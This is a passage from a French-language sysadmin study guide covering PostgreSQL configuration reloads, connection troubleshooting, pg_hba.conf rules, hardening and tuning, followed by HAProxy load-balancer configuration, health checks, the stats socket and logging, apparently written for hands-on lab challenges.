# Recharge postgresql.conf + pg_hba.conf SANS couper connexions
# ⚠️ Certains paramètres require restart (listen_addresses, port, shared_buffers)
# Use case : Modif pg_hba.conf rules, log settings, autovacuum config

# Vérifier statut
sudo systemctl status postgresql

# Activer boot startup
sudo systemctl enable postgresql

# Démarrer + activer (combo)
sudo systemctl enable --now postgresql
```

**reload vs restart (CRITICAL) :**

| Action | reload | restart |
|--------|--------|---------|
| Connexions actives | ✅ Maintenues (0 downtime) | ❌ Terminées (downtime) |
| Queries en cours | ✅ Continuent | ❌ Rollback/abort |
| Config reload | ✅ Oui (majorité params) | ✅ Oui (ALL params) |
| Params require restart | ❌ (listen_addresses, port, shared_buffers) | ✅ Tous params |
| Production preferred | ✅ Toujours tenter reload avant restart | ❌ Éviter si possible |

**Params require restart (common) :**
- `listen_addresses`
- `port`
- `shared_buffers`
- `max_connections`
- `wal_level`
- `max_wal_senders`

**Params reload OK :**
- `log_*` (tous settings logs)
- `autovacuum_*`
- Règles pg_hba.conf
- La plupart tuning parameters

**Vérifier si param require restart :**
```bash
sudo -u postgres psql -c "SELECT name, setting, context FROM pg_settings WHERE name = 'shared_buffers';"
#     name       | setting |  context
# ---------------+---------+-----------
# shared_buffers | 16384   | postmaster

# context values :
# - postmaster : REQUIRE RESTART
# - sighup : reload OK
# - user : changeable par user (SET command)
```

### Debugging PostgreSQL (Scenario 07 workflow)

**Problème : Application cannot connect (connection refused) :**

```bash
# Step 1 : Vérifier PostgreSQL running
sudo systemctl status postgresql
# Si inactive → sudo systemctl start postgresql

# Step 2 : Tester connexion socket UNIX (local)
sudo -u postgres psql -c '\q'
# Si OK → PostgreSQL fonctionne, problème = TCP/IP config
# Si ERREUR → PostgreSQL crash ou PGDATA corrompu

# Step 3 : Tester connexion TCP/IP localhost
PGPASSWORD=password psql -h 127.0.0.1 -d dbname -U username -c '\q'
# Si "connection refused" → listen_addresses problem
# Si "authentication failed" → pg_hba.conf ou password problem

# Step 4 : Vérifier listen_addresses
sudo -u postgres psql -c 'SHOW listen_addresses;'
#  listen_addresses
# ------------------
#  localhost         # ← OK (écoute 127.0.0.1)
# (ou vide '' = socket UNIX only → PROBLÈME Scenario 07)

# Step 5 : Vérifier port écoute
sudo ss -tuln | grep 5432
# tcp   LISTEN   127.0.0.1:5432    # ← PostgreSQL écoute TCP/IP localhost
# (Si absent = listen_addresses vide ou commenté)

# Step 6 : Modifier listen_addresses (Scenario 07 fix)
sudo vi /etc/postgresql/13/main/postgresql.conf
# Décommenter + set :
listen_addresses = 'localhost'    # Local TCP + socket UNIX
# ou
listen_addresses = '*'            # Toutes interfaces

# Step 7 : Reload (tenter) ou restart (si reload insuffisant)
sudo systemctl reload postgresql
# listen_addresses = postmaster context → require RESTART
sudo systemctl restart postgresql

# Step 8 : Re-tester connexion
sudo ss -tuln | grep 5432
PGPASSWORD=password psql -h 127.0.0.1 -d dbname -U username -c '\q'
# Si OK → Problème résolu
```

**Problème : Authentication failed (password error) :**

```bash
# Step 1 : Vérifier pg_hba.conf rules ordre
sudo vi /etc/postgresql/13/main/pg_hba.conf

# Chercher règles concernées (ex : host all all 127.0.0.1/32)
# Vérifier AUCUNE règle "reject" AVANT règle allow (Scenario 07)

# EXEMPLE BAD (reject before allow) :
# host    all    all    all              reject    # ← BLOQUE TOUT (ligne 1)
# host    all    all    127.0.0.1/32     md5       # ← Jamais atteinte

# FIX : Supprimer/commenter reject OU déplacer APRÈS allow
# host    all    all    127.0.0.1/32     md5       # ← ligne 1 (ALLOW)
# host    all    all    all              reject    # ← ligne 2 (DENY rest)

# Step 2 : Reload pg_hba.conf
sudo systemctl reload postgresql
# pg_hba.conf changes = reload OK (pas restart requis)

# Step 3 : Vérifier password user correct
sudo -u postgres psql
ALTER USER app1user WITH PASSWORD 'CorrectPassword';
\q

# Step 4 : Re-tester connexion
PGPASSWORD='CorrectPassword' psql -h 127.0.0.1 -d app1 -U app1user -c '\q'
```

**Logs PostgreSQL :**

```bash
# Logs Debian/Ubuntu
sudo tail -f /var/log/postgresql/postgresql-13-main.log

# Logs RHEL/CentOS
sudo tail -f /var/lib/pgsql/data/log/postgresql-*.log

# Logs journald
sudo journalctl -u postgresql -f
sudo journalctl -u postgresql -n 50

# Rechercher erreurs
sudo grep -i "error" /var/log/postgresql/postgresql-13-main.log
sudo grep -i "fatal" /var/log/postgresql/postgresql-13-main.log
sudo grep -i "connection" /var/log/postgresql/postgresql-13-main.log

# Activer verbose logging (debug)
sudo vi /etc/postgresql/13/main/postgresql.conf
log_min_messages = info          # ou debug1
log_connections = on
log_disconnections = on
log_min_duration_statement = 0   # Logger TOUTES queries

sudo systemctl reload postgresql
sudo tail -f /var/log/postgresql/postgresql-13-main.log
```

### Use cases PostgreSQL

**1. Application database (web apps, APIs) :**
```bash
# Database Django, Rails, Node.js, PHP
# User app dédié, permissions restreintes
CREATE DATABASE webapp OWNER webapp_user;
GRANT CONNECT ON DATABASE webapp TO webapp_user;
GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO webapp_user;
```

**2. Data warehousing / Analytics :**
```bash
# Queries complexes, agrégations, OLAP
# Extensions : TimescaleDB (time-series), Citus (sharding)
# Performance tuning : shared_buffers élevé, work_mem élevé
```

**3. GIS (Geographic Information Systems) :**
```bash
# Extension PostGIS (spatial data)
CREATE EXTENSION postgis;
# Store coordinates, polygons, calculate distances, etc.
```

**4. Replication (High Availability) :**
```bash
# Streaming replication master-slave
# wal_level = replica
# Backup continuous via WAL archiving
```

### Sécurité PostgreSQL production

**1. pg_hba.conf restrictif :**
```bash
# JAMAIS trust ou 0.0.0.0/0 en production
# Utiliser scram-sha-256 (pas md5 legacy)
# Règles spécifiques (IP/réseau précis)

host    all    all    10.0.1.0/24    scram-sha-256    # App servers uniquement
host    all    all    0.0.0.0/0      reject           # Bloquer reste
```

**2. SSL/TLS connexions :**
```bash
ssl = on
ssl_cert_file = '/etc/ssl/certs/server.crt'
ssl_key_file = '/etc/ssl/private/server.key'

# pg_hba.conf force SSL
hostssl    all    all    0.0.0.0/0    scram-sha-256
hostnossl  all    all    0.0.0.0/0    reject
```

**3. Firewall :**
```bash
# Bloquer port 5432 internet (ouvrir uniquement app servers IPs)
sudo firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="10.0.1.0/24" port port="5432" protocol="tcp" accept'
sudo firewall-cmd --reload

# iptables alternative
sudo iptables -A INPUT -p tcp -s 10.0.1.0/24 --dport 5432 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 5432 -j DROP
```

**4. Passwords forts + rotation :**
```bash
ALTER USER app1user WITH PASSWORD 'ComplexP@ssw0rd!2024';
# Rotation 90 jours (policy)
```

**5. Least privilege :**
```bash
# Users applications = permissions minimales (pas superuser)
REVOKE ALL ON DATABASE app1 FROM PUBLIC;
GRANT CONNECT ON DATABASE app1 TO app1user;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO app1user;
# PAS de DROP, CREATE, ALTER
```

**6. Backups réguliers :**
```bash
# pg_dump (logical backup)
pg_dump -U postgres -d app1 -F c -f /backups/app1_$(date +%Y%m%d).dump

# WAL archiving (continuous backup)
archive_mode = on
archive_command = 'cp %p /archive/%f'
```

### Performance tuning PostgreSQL

**Tuning mémoire (serveur 8GB RAM dédié PostgreSQL) :**

```bash
shared_buffers = 2GB              # 25% RAM
effective_cache_size = 6GB        # 75% RAM
work_mem = 16MB                   # (8GB - 2GB) / (100 conn * 3) ≈ 20MB
maintenance_work_mem = 256MB      # Grosses tables
```

**Tuning queries slow :**

```bash
# Identifier slow queries
log_min_duration_statement = 1000    # Log queries > 1 seconde

# Analyser query plan
EXPLAIN ANALYZE SELECT * FROM users WHERE email = 'test@example.com';

# Créer indexes
CREATE INDEX idx_users_email ON users(email);
```

**Autovacuum tuning :**

```bash
autovacuum = on
autovacuum_max_workers = 3
autovacuum_naptime = 1min          # Fréquence scan tables (défaut 1min)
```

### ⚠️ Pitfalls PostgreSQL

1. **listen_addresses commenté (Scenario 07)** → Socket UNIX only (TCP/IP refused)
2. **pg_hba.conf ordre règles (Scenario 07)** → reject AVANT allow = block all
3. **Oublier reload après modif pg_hba.conf** → Changes ignorés
4. **restart au lieu reload** → Downtime inutile (connexions coupées)
5. **Trust auth production** → Pas password = accès libre (sécurité 0)
6. **Port 5432 ouvert internet** → Attaques bruteforce (scanner bots)
7. **Passwords faibles** → Compromission users
8. **VACUUM désactivé** → Bloat tables (performances dégradées)
9. **shared_buffers trop élevé** → Swap (contre-productif)
10. **work_mem trop élevé** → OOM (Out Of Memory) si multiples queries parallèles

### Fichiers PostgreSQL importants

**Configuration :**
- `/etc/postgresql/13/main/postgresql.conf` (Debian)
- `/var/lib/pgsql/data/postgresql.conf` (RHEL)
- `/etc/postgresql/13/main/pg_hba.conf` (HBA rules)
- `/etc/postgresql/13/main/pg_ident.conf` (User mapping - optionnel)

**Data :**
- `/var/lib/postgresql/13/main/` (Debian PGDATA)
- `/var/lib/pgsql/data/` (RHEL PGDATA)
  * `base/` : Databases files
  * `pg_wal/` : Write-Ahead Logs (transactions)
  * `global/` : Cluster-wide tables

**Logs :**
- `/var/log/postgresql/postgresql-13-main.log` (Debian)
- `/var/lib/pgsql/data/log/` (RHEL)

**Socket UNIX :**
- `/var/run/postgresql/.s.PGSQL.5432` (connexions local peer auth)

---

## Module 32 : HAProxy - Load Balancer & Reverse Proxy (Challenge 16)

**Concepts :**
- **Load Balancer** : Répartit trafic réseau entre multiples serveurs backend (scaling horizontal)
- **Reverse Proxy** : Intermédiaire entre clients et serveurs backend (proxy inverse)
- **HAProxy (High Availability Proxy)** : LB open source performant (layer 4/7)
- **Health Checks** : Surveillance disponibilité backends (retire backends down automatiquement)

### HAProxy vs Nginx vs Apache mod_proxy

| Critère | HAProxy | Nginx | Apache mod_proxy |
|---------|---------|-------|------------------|
| Performance | ✅✅✅ Excellent (C optimisé) | ✅✅ Très bon | ✅ Bon |
| Layer 4 (TCP) | ✅ Native | ✅ Oui (stream module) | ❌ Non (layer 7 only) |
| Layer 7 (HTTP) | ✅ Native | ✅ Native | ✅ Native |
| Config complexity | Medium (haproxy.cfg) | Medium (nginx.conf) | Low (httpd.conf) |
| Stats page | ✅ Built-in | ⚠️ Module externe | ⚠️ Module externe |
| SSL termination | ✅ Oui | ✅ Oui | ✅ Oui |
| Health checks | ✅✅ Advanced (customizable) | ✅ Basic | ✅ Basic |
| Sticky sessions | ✅ Native | ✅ Oui | ✅ Oui |
| Use case principal | **Load balancing pur** | Web server + LB | Web server + reverse proxy |
| Mémoire footprint | ✅ Très faible | ✅ Faible | ⚠️ Moyen/élevé |

**Recommandations :**
- **HAProxy** : Load balancing pur, TCP/HTTP, performance critique, health checks advanced
- **Nginx** : Web server + LB combo, static files + proxy, HTTP/2, WebSockets
- **Apache** : Legacy stacks, mod_proxy_balancer, intégration Apache ecosystem

### Installation HAProxy

```bash
# RHEL/CentOS/Rocky
sudo yum install haproxy -y

# Debian/Ubuntu
sudo apt install haproxy -y

# Vérifier version
haproxy -v
# HAProxy version 1.8.27 (ou 2.x)

# Démarrer + activer boot
sudo systemctl enable --now haproxy

# Vérifier statut
sudo systemctl status haproxy
```

**Versions HAProxy :**
- **HAProxy 1.8** : LTS stable (RHEL 8, Debian 10)
- **HAProxy 2.0-2.4** : Features modernes (HTTP/2, threading)
- **HAProxy 2.6+** : Latest (QUIC/HTTP3 experimental)

### Architecture HAProxy

**Workflow load balancing :**
```
Client → [Internet] → HAProxy Frontend (port 80/443)
                           ↓
                     ACL Rules + Routing
                           ↓
                     Backend Pool (roundrobin)
                     ├─ Server 1 (check health)
                     ├─ Server 2 (check health)
                     └─ Server 3 (check health)
                           ↓
                     Response → Client
```

**Composants HAProxy :**
- **Frontend** : Point d'entrée (bind port, ACL rules, default_backend)
- **Backend** : Pool serveurs (balance algorithm, health checks, servers list)
- **Listen** : Frontend + Backend combinés (syntaxe simplifiée)
- **Stats** : Interface admin (runtime stats, enable/disable servers)

### Configuration /etc/haproxy/haproxy.cfg (Challenge 16)

**Fichier :** `/etc/haproxy/haproxy.cfg`

**Structure config complète :**

```haproxy
#---------------------------------------------------------------------
# Global settings
#---------------------------------------------------------------------
global
    # Logging
    log         127.0.0.1 local2
    
    # Chroot jail (sécurité)
    chroot      /var/lib/haproxy
    pidfile     /var/run/haproxy.pid
    
    # Max connexions simultanées
    maxconn     4000
    
    # User/group daemon
    user        haproxy
    group       haproxy
    
    # Mode daemon (background)
    daemon
    
    # Stats socket (admin CLI - ⚠️ NE JAMAIS SUPPRIMER)
    stats socket /var/lib/haproxy/stats level admin
    
    # Tuning SSL
    tune.ssl.default-dh-param 2048

#---------------------------------------------------------------------
# Common defaults
#---------------------------------------------------------------------
defaults
    # Mode proxy (http ou tcp)
    mode                    http
    
    # Logging
    log                     global
    option                  httplog
    option                  dontlognull
    
    # Timeouts
    timeout connect         10s
    timeout client          1m
    timeout server          1m
    timeout http-keep-alive 10s
    timeout http-request    10s
    timeout queue           1m
    
    # Erreurs HTTP custom
    errorfile 400 /etc/haproxy/errors/400.http
    errorfile 403 /etc/haproxy/errors/403.http
    errorfile 408 /etc/haproxy/errors/408.http
    errorfile 500 /etc/haproxy/errors/500.http
    errorfile 502 /etc/haproxy/errors/502.http
    errorfile 503 /etc/haproxy/errors/503.http
    errorfile 504 /etc/haproxy/errors/504.http

#---------------------------------------------------------------------
# Frontend (Challenge 16)
#---------------------------------------------------------------------
frontend main
    # Bind port 80 (HTTP) toutes interfaces
    bind *:80
    
    # Backend par défaut
    default_backend             app
    
    # Option forwardfor (preserve IP client)
    option                      forwardfor
    
    # Optionnel : ACL rules
    # acl is_api path_beg /api
    # use_backend api_servers if is_api

#---------------------------------------------------------------------
# Backend (Challenge 16)
#---------------------------------------------------------------------
backend app
    # Algorithme load balancing
    balance     roundrobin
    
    # Serveurs backend + health checks
    server  stapp01 172.16.238.10:5004 check
    server  stapp02 172.16.238.11:5004 check
    server  stapp03 172.16.238.12:5004 check
    
    # Optionnel : options avancées
    # option httpchk GET /health
    # http-check expect status 200
```

### Section GLOBAL (paramètres daemon)

```haproxy
global
    # Logging vers syslog
    log 127.0.0.1 local2
    # local2 = facility syslog (rsyslog config requis)
    
    # Chroot jail
    chroot /var/lib/haproxy
    # Isolation filesystem (sécurité, limite accès filesystem)
    
    # PID file
    pidfile /var/run/haproxy.pid
    
    # Connexions max simultanées
    maxconn 4000
    # Tuning selon RAM/CPU serveur
    # Calcul : (RAM disponible - OS overhead) / (avg conn size ~50KB)
    # Exemple : 2GB RAM → maxconn = 40000
    
    # User/group daemon (non-root)
    user haproxy
    group haproxy
    # Principe moindre privilège (drop root après bind ports)
    
    # Mode daemon (background)
    daemon
    
    # Stats socket (admin CLI)
    stats socket /var/lib/haproxy/stats level admin
    # ⚠️ CRITICAL : NE JAMAIS SUPPRIMER (requis runtime management)
    # Permissions : level admin (full control) | user (read-only)
    
    # Tuning SSL
    tune.ssl.default-dh-param 2048
    # Diffie-Hellman param size (SSL handshake)
    
    # Nombre threads (HAProxy 2.0+)
    nbthread 4
    # CPU cores utilisés (auto-detect ou manuel)
```

### Section DEFAULTS (paramètres par défaut)

```haproxy
defaults
    # Mode proxy
    mode http
    # http = layer 7 (HTTP headers inspection, cookies, etc.)
    # tcp = layer 4 (simple port forwarding, faster, SSL passthrough)
    
    # Logging
    log global
    # Hérite config log section global
    
    option httplog
    # Format logs verbose HTTP (method, URI, status, timings)
    
    option dontlognull
    # Ignore requêtes vides (port scanning, probes)
    
    # Timeouts (CRITICAL tuning)
    timeout connect 10s
    # Timeout connexion backend (TCP handshake)
    
    timeout client 1m
    # Timeout inactivité client (pas data reçue)
    
    timeout server 1m
    # Timeout inactivité backend server (pas data reçue backend)
    
    timeout http-keep-alive 10s
    # Timeout keep-alive HTTP (connexions persistantes)
    
    timeout http-request 10s
    # Timeout requête HTTP complète (headers)
    
    timeout queue 1m
    # Timeout queue si tous backends busy (maxconn atteint)
    
    # Retry policy
    retries 3
    # Nombre retry connexion backend failed
    
    # Redispatch
    option redispatch
    # Si backend fail → redistribuer requête autre backend (failover)
```

### Section FRONTEND (points d'entrée - Challenge 16)

```haproxy
frontend main
    # Bind port (écoute)
    bind *:80
    # *:80 = toutes interfaces IPv4 port 80
    # 0.0.0.0:80 = équivalent
    # :443 ssl crt /path/cert.pem = HTTPS avec certificat
    
    # Backend par défaut
    default_backend app
    # Tout trafic → backend "app"
    
    # Option forwardfor
    option forwardfor
    # Ajoute HTTP header : X-Forwarded-For: <client_ip>
    # Backend voit IP client original (pas IP HAProxy)
    # Essentiel pour logs backend, analytics, geo-location
    
    # ACL (Access Control List) - routing conditionnel
    acl is_api path_beg /api
    acl is_static path_beg /static
    acl is_admin hdr(host) -i admin.example.com
    # path_beg = URI commence par
    # hdr(host) = HTTP header Host
    # -i = case insensitive
    
    # Routing conditionnel (use_backend)
    use_backend api_servers if is_api
    use_backend static_servers if is_static
    use_backend admin_servers if is_admin
    # Si ACL match → utiliser backend spécifique
    # Sinon → default_backend
    
    # HTTP headers manipulation
    http-request set-header X-Client-IP %[src]
    # Ajouter custom header (IP source client)
    
    http-response set-header X-Powered-By HAProxy
    # Ajouter header dans responses
    
    # Rate limiting (anti-DDoS basique)
    stick-table type ip size 100k expire 30s store http_req_rate(10s)
    http-request track-sc0 src
    http-request deny if { sc_http_req_rate(0) gt 100 }
    # Bloquer IP > 100 requêtes/10s
```

### Section BACKEND (serveurs backend - Challenge 16)

```haproxy
backend app
    # Algorithme load balancing
    balance roundrobin
    # roundrobin = distribution séquentielle équitable (A→B→C→A...)
    
    # Serveurs backend
    server stapp01 172.16.238.10:5004 check
    server stapp02 172.16.238.11:5004 check
    server stapp03 172.16.238.12:5004 check
    
    # Syntaxe server :
    # server <name> <IP>:<PORT> [options]
    
    # Options server courantes :
    # check                  → Health check TCP actif
    # check inter 2s         → Intervalle health check (défaut 2s)
    # check fall 3           → Échecs consécutifs avant DOWN (défaut 3)
    # check rise 2           → Succès consécutifs avant UP (défaut 2)
    # weight 100             → Poids server (100 = normal, 50 = moitié trafic)
    # maxconn 500            → Connexions max ce server
    # backup                 → Server backup (utilisé si tous primaires DOWN)
    # disabled               → Server désactivé (ignore)
    # cookie s1              → Cookie session affinity
    
    # HTTP health check (custom)
    option httpchk GET /health
    http-check expect status 200
    # GET /health → attend HTTP 200 OK
    
    # Sticky sessions (session affinity)
    cookie SERVERID insert indirect nocache
    server stapp01 172.16.238.10:5004 check cookie s1
    server stapp02 172.16.238.11:5004 check cookie s2
    # Cookie HAProxy → même client toujours même backend
    
    # Options backend
    option forwardfor
    # Preserve X-Forwarded-For header
    
    option httpclose
    # Fermer connexions HTTP après response (pas keep-alive)
```

### Algorithmes Load Balancing

**Balance algorithms disponibles :**

```haproxy
# 1. roundrobin (défaut Challenge 16)
balance roundrobin
# Distribution séquentielle équitable : A→B→C→A→B→C...
# Use case : Backends homogènes (même CPU/RAM/capacité)
# Avantage : Simple, prévisible, équitable
# Inconvénient : Ignore charge réelle backends

# 2. leastconn (connexions actives)
balance leastconn
# Route vers backend avec MOINS connexions actives
# Use case : Long-running connections (WebSockets, uploads, streaming)
# Avantage : Balance charge réelle
# Inconvénient : Overhead tracking connexions

# 3. source (hash IP client)
balance source
# Hash IP client → toujours même backend (sticky sessions)
# Use case : Applications stateful (sessions serveur, cache local)
# Avantage : Session persistence sans cookies
# Inconvénient : Distribution asymétrique (IP NAT groupées)

# 4. uri (hash URI)
balance uri
# Hash URI requête → toujours même backend
# Use case : Caching backends (même URI → même cache)
# Avantage : Cache hit ratio élevé
# Inconvénient : Hot spots (URIs populaires surchargent 1 backend)

# 5. hdr (hash HTTP header)
balance hdr(User-Agent)
# Hash header spécifique
# Use case : Routing par user-agent (mobile vs desktop)

# 6. random
balance random
# Distribution aléatoire pure
# Use case : Simple, pas besoin cohérence
# Avantage : Très rapide (pas state)
```

**Comparaison use cases :**

| Use Case | Algorithm recommandé | Raison |
|----------|---------------------|---------|
| Web apps stateless | `roundrobin` | Simple, équitable, performant |
| API REST stateless | `roundrobin` ou `leastconn` | Équilibre charge |
| WebSockets / SSE | `leastconn` | Long-running connexions |
| Sessions PHP serveur | `source` ou cookies | Sticky sessions |
| Reverse proxy cache | `uri` | Cache hit ratio |
| File uploads | `leastconn` | Éviter surcharge 1 backend |

### Health Checks (surveillance backends)

**TCP health check (défaut - Challenge 16) :**

```haproxy
backend app
    server stapp01 172.16.238.10:5004 check
    # check = TCP connect port 5004 toutes les 2s
    # Si connect() réussit → backend UP
    # Si échec 3 fois consécutives (fall 3) → backend DOWN
```

**HTTP health check (custom endpoint) :**

```haproxy
backend app
    option httpchk GET /health
    http-check expect status 200
    server stapp01 172.16.238.10:5004 check
    
    # HAProxy envoie :
    # GET /health HTTP/1.0
    # Host: <server_ip>
    
    # Backend doit répondre HTTP 200 OK
    # Si 200 → backend UP
    # Si 404, 500, timeout → backend DOWN
```

**Health check avancé (regex response) :**

```haproxy
backend app
    option httpchk GET /status
    http-check expect string "OK"
    # Attend "OK" dans body response
    
    http-check expect rstring ^HTTP/1\.(0|1)\ 200
    # Regex status line
```

**Health check parameters tuning :**

```haproxy
backend app
    server stapp01 172.16.238.10:5004 check inter 5s fall 2 rise 3
    
    # inter 5s     → Health check toutes les 5 secondes (défaut 2s)
    # fall 2       → 2 échecs consécutifs avant DOWN (défaut 3)
    # rise 3       → 3 succès consécutifs avant UP (défaut 2)
    
    # Calcul downtime detection :
    # Downtime = inter * fall = 5s * 2 = 10s
    # (Backend down détecté en 10 secondes)
    
    # Calcul recovery time :
    # Recovery = inter * rise = 5s * 3 = 15s
    # (Backend recovered UP en 15 secondes)
```

**Use cases health check intervals :**

| Intervalle | Use case | Trade-off |
|------------|----------|-----------|
| `inter 2s` (défaut) | Production standard | Détection rapide (6s downtime) |
| `inter 5s` | Backends lents (DB) | Moins overhead backends |
| `inter 10s` | Health checks coûteux | Réduit charge mais downtime +20s |
| `inter 1s` | Haute disponibilité critique | Détection 3s mais overhead élevé |

### Option forwardfor (preserve IP client - Challenge 16)

```haproxy
frontend main
    option forwardfor
    # Ajoute HTTP header : X-Forwarded-For: <client_ip>

# Backend voit :
# X-Forwarded-For: 203.0.113.45
# (IP client original, pas IP HAProxy 10.0.1.5)
```

**Logs backend avec forwardfor :**

```bash
# SANS forwardfor :
# Backend Apache access.log :
# 10.0.1.5 - - [15/Jan/2026:10:30:00] "GET / HTTP/1.1" 200
# ↑ IP HAProxy (pas client)

# AVEC forwardfor :
# Backend Apache LogFormat "%{X-Forwarded-For}i %l %u %t \"%r\" %>s %b"
# 203.0.113.45 - - [15/Jan/2026:10:30:00] "GET / HTTP/1.1" 200
# ↑ IP client original
```

**Security consideration :**
```haproxy
# Attention : client peut forger X-Forwarded-For
# Protection : Supprimer X-Forwarded-For avant forwardfor
http-request del-header X-Forwarded-For
option forwardfor
# HAProxy set X-Forwarded-For trusté
```

### Stats Socket (admin CLI - ⚠️ CRITICAL)

**Fichier :** `/var/lib/haproxy/stats` (socket UNIX)

**⚠️ NE JAMAIS SUPPRIMER** (requis Challenge 16 consigne)

```haproxy
global
    stats socket /var/lib/haproxy/stats level admin
    # level admin = full control (enable/disable servers, set weights)
    # level user = read-only (show stat, show info)
```

**Commandes stats socket (via socat) :**

```bash
# Installer socat
sudo yum install socat -y

# Show statistics
echo "show stat" | sudo socat stdio /var/lib/haproxy/stats
# Output : CSV statistics tous frontends/backends

# Show backend servers state
echo "show servers state" | sudo socat stdio /var/lib/haproxy/stats

# Disable server (maintenance)
echo "disable server app/stapp01" | sudo socat stdio /var/lib/haproxy/stats
# Backend "app", server "stapp01" → MAINT (pas nouveau trafic)

# Enable server
echo "enable server app/stapp01" | sudo socat stdio /var/lib/haproxy/stats

# Set server weight (reduce trafic graduellement)
echo "set weight app/stapp01 50%" | sudo socat stdio /var/lib/haproxy/stats
# Server reçoit 50% trafic normal (graceful scaling)

# Show info (version, uptime, etc.)
echo "show info" | sudo socat stdio /var/lib/haproxy/stats

# Show errors
echo "show errors" | sudo socat stdio /var/lib/haproxy/stats
```

**Use cases stats socket :**
- **Maintenance servers** : Disable avant update (drain connexions)
- **Gradual deployment** : Weight 0%→10%→50%→100% (canary deployment)
- **Debugging** : Show errors, show stat (real-time metrics)
- **Automation** : Scripts monitoring (Nagios, Prometheus)

### Stats Page (Web UI)

**Activer stats page HTTP :**

```haproxy
listen stats
    bind *:8080
    stats enable
    stats uri /haproxy?stats
    stats realm HAProxy\ Statistics
    stats auth admin:password
    stats refresh 5s
    stats show-node
    stats show-legends
    
# Access : http://haproxy-ip:8080/haproxy?stats
# Login : admin / password
```

**Stats page features :**
- ✅ Trafic real-time (requests/s, bandwidth)
- ✅ Backend status (UP/DOWN/MAINT)
- ✅ Sessions actives par backend
- ✅ Health checks état
- ✅ Queues (requests en attente)
- ✅ Downtime historique
- ⚠️ **SÉCURITÉ** : Toujours protéger par auth (`stats auth`) + firewall port 8080

### Commandes HAProxy essentielles

```bash
# Vérifier syntax config (AVANT reload/restart)
haproxy -c -f /etc/haproxy/haproxy.cfg
# Output : Configuration file is valid
# Errors → affiche lignes problématiques

# Tester config + afficher (debug)
haproxy -f /etc/haproxy/haproxy.cfg -db
# -db = debug mode (foreground, verbose logs)

# Voir version
haproxy -v
haproxy -vv    # Verbose (features compilées)

# Reload config (0 downtime)
sudo systemctl reload haproxy
# Envoie SIGUSR2 → graceful reload (connexions actives finissent)

# Restart (downtime)
sudo systemctl restart haproxy
# Coupe connexions actives immédiatement

# Status service
sudo systemctl status haproxy

# Activer boot startup
sudo systemctl enable haproxy

# Logs HAProxy (RHEL/CentOS)
sudo tail -f /var/log/messages | grep haproxy

# Logs journald
sudo journalctl -u haproxy -f
sudo journalctl -u haproxy -n 100

# Vérifier port écoute
sudo ss -tuln | grep :80
sudo netstat -tuln | grep :80

# Tester frontend
curl http://localhost:80
curl -I http://localhost:80    # Headers only

# Tester backend health
curl http://172.16.238.10:5004
curl http://172.16.238.11:5004
curl http://172.16.238.12:5004
```

### Logging HAProxy

**HAProxy logs via rsyslog (configuration requise) :**

**1. Activer UDP syslog :**

```bash
# Éditer /etc/rsyslog.conf
sudo vi /etc/rsyslog.conf

# Décommenter lignes UDP :
$ModLoad imudp
$UDPServerRun 514

# Restart rsyslog
sudo systemctl restart rsyslog
```

**2. Config HAProxy logs :**

```bash
# Éditer /etc/rsyslog.d/haproxy.conf
sudo vi /etc/rsyslog.d/haproxy.conf

# Ajouter :
local2.*    /var/log/haproxy.log

# Restart rsyslog
sudo systemctl restart rsyslog
```

**3. Logs HAProxy désormais :**

```bash
sudo tail -f /var/log/haproxy.log

# Format logs (option httplog) :
# Jan 15 10:30:15 haproxy[1234]: 203.0.113.45:54321 [15/Jan/2026:10:30:15.123] main app/stapp01 0/0/1/2/5 200 512 - - ---- 1/1/0/0/0 0/0 "GET / HTTP/1.1"
# │                             │                   │        │           │      │   │   │  │  │    │       │      │
# │                             │                   │        │           │      │   │   │  │  │    │       │      └─ Request
# │                             │                   │        │           │      │   │   │  │  │    │       └─ Frontend name
# │                             │                   │        │           │      │   │   │  │  │    └─ Connexions state
# │                             │                   │        │           │      │   │   │  │  └─ Queues
# │                             │                   │        │           │      │   │   │  └─ Backend queue
# │                             │                   │        │           │      │   │   └─ Server queue
# │                             │                   │        │           │      │   └─ Bytes read
# │                             │                   │        │           │      └─ Status code
# │                             │                   │        │           └─ Timers (Tq/Tw/Tc/Tr/Tt)
# │                             │                   │        └─ Backend/server
# │                             │                   └─ Frontend
# │                             └─ Client IP:port
# └─ Timestamp
```

**Timers explication :**
- `Tq` : Time in queue (waiting backend disponible)
- `Tw` : Time waiting connexion backend
- `Tc` : Time connect backend (TCP handshake)
- `Tr` : Time receive response backend
- `Tt` : Total time (Tq+Tw+Tc+Tr)

### Use Cases HAProxy Production

**1. Web application load balancing (Challenge 16) :**

```haproxy
frontend web
    bind *:80
    bind *:443 ssl crt /etc/ssl/certs/domain.pem
    redirect scheme https if !{ ssl_fc }    # Force HTTPS
    default_backend web_servers

backend web_servers
    balance roundrobin
    option httpchk GET /health
    server web1 10.0.1.10:80 check
    server web2 10.0.1.11:80 check
    server web3 10.0.1.12:80 check
```

**2. Database connection pooling (PostgreSQL/MySQL) :**

```haproxy
listen postgres
    bind *:5432
    mode tcp
    balance leastconn
    option tcplog
    server pg1 10.0.2.10:5432 check
    server pg2 10.0.2.11:5432 check backup
    # pg2 = backup (utilisé seulement si pg1 DOWN)
```

**3. Microservices routing (par URI) :**

```haproxy
frontend api
    bind *:443 ssl crt /etc/ssl/certs/api.pem
    
    acl is_users path_beg /users
    acl is_orders path_beg /orders
    acl is_payments path_beg /payments
    
    use_backend users_service if is_users
    use_backend orders_service if is_orders
    use_backend payments_service if is_payments

backend users_service
    balance roundrobin
    server user1 10.0.3.10:8080 check
    server user2 10.0.3.11:8080 check

backend orders_service
    balance leastconn
    server order1 10.0.3.20:8080 check
    server order2 10.0.3.21:8080 check
```

**4. Blue/Green deployment (canary) :**

```haproxy
backend app
    balance roundrobin
    # Production (90%)
    server prod1 10.0.4.10:80 check weight 30
    server prod2 10.0.4.11:80 check weight 30
    server prod3 10.0.4.12:80 check weight 30
    
    # Canary (10%)
    server canary1 10.0.5.10:80 check weight 10
    # Test nouvelle version avec 10% trafic
```

### SSL/TLS Termination HAProxy

```haproxy
# Certificat SSL (PEM format : cert + key + intermediate)
# cat domain.crt domain.key intermediate.crt > /etc/ssl/certs/domain.pem

frontend https
    bind *:443 ssl crt /etc/ssl/certs/domain.pem
    
    # Force HTTPS
    bind *:80
    redirect scheme https if !{ ssl_fc }
    
    # HSTS (HTTP Strict Transport Security)
